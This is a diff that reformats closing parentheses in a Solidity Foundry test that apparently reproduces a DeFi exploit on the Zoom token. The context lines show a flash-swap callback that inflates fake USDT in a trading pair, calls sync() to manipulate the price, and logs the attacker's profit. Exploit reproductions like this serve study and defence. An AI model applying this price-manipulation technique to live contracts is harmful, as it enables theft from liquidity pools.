@@ -50,7 +50,7 @@ contract ContractTest is DSTest {
 
         emit log_named_decimal_uint(
             "[End] After repay, Profit: USDT balance of attacker", Usdt.balanceOf(address(this)), 18
-            );
+        );
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
@@ -67,13 +67,13 @@ contract ContractTest is DSTest {
         n2[0] = 1_000_000 ether;
         emit log_named_decimal_uint(
             "Before manipulate price, Fake USDT balance of pair:", IERC20(fUSDT).balanceOf(address(pp)), 18
-            );
+        );
         emit log_named_decimal_uint("Before manipulate price, Zoom balance of pair:", Zoom.balanceOf(address(pp)), 18);
         IUSD(batch).batchToken(n1, n2, fUSDT);
 
         emit log_named_decimal_uint(
             "After manipulate price, Fake USDT balance of pair:", IERC20(fUSDT).balanceOf(address(pp)), 18
-            );
+        );
         emit log_named_decimal_uint("After manipulate price, Zoom balance of pair:", Zoom.balanceOf(address(pp)), 18);
 
         // calling pair Fake USDT-Zoom sync() to update latest price
